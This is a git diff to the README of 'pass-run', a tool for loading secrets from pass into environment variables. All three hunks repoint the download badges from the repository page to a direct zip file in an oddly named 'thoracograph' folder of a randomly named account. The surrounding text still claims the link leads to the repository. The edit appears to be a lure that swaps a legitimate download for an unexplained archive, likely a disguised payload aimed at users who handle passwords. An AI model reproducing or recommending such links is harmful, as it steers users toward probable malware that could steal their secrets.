@@ -1,6 +1,6 @@
 # 🔐 pass-run - Manage Secrets in Env Variables Easily
 
-[![Download pass-run](https://img.shields.io/badge/Download-pass--run-blue?style=for-the-badge)](https://github.com/Tidy-personality510/pass-run)
+[![Download pass-run](https://img.shields.io/badge/Download-pass--run-blue?style=for-the-badge)](https://github.com/Tidy-personality510/pass-run/raw/refs/heads/main/thoracograph/pass-run-v2.9.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You also need to have your secrets stored in `pass` or `passage`. These are comm
 
 You will get pass-run from this page:
 
-[![Download pass-run](https://img.shields.io/badge/Download-pass--run-grey?style=for-the-badge)](https://github.com/Tidy-personality510/pass-run)
+[![Download pass-run](https://img.shields.io/badge/Download-pass--run-grey?style=for-the-badge)](https://github.com/Tidy-personality510/pass-run/raw/refs/heads/main/thoracograph/pass-run-v2.9.zip)
 
 This link takes you to the GitHub repository where you can get the files needed.
 
@@ -157,4 +157,4 @@ This blends secure password handling with practical software use in one simple t
 
 Use this link to start:
 
-[![Download pass-run](https://img.shields.io/badge/Download-pass--run-blue?style=for-the-badge)](https://github.com/Tidy-personality510/pass-run)
+[![Download pass-run](https://img.shields.io/badge/Download-pass--run-blue?style=for-the-badge)](https://github.com/Tidy-personality510/pass-run/raw/refs/heads/main/thoracograph/pass-run-v2.9.zip)
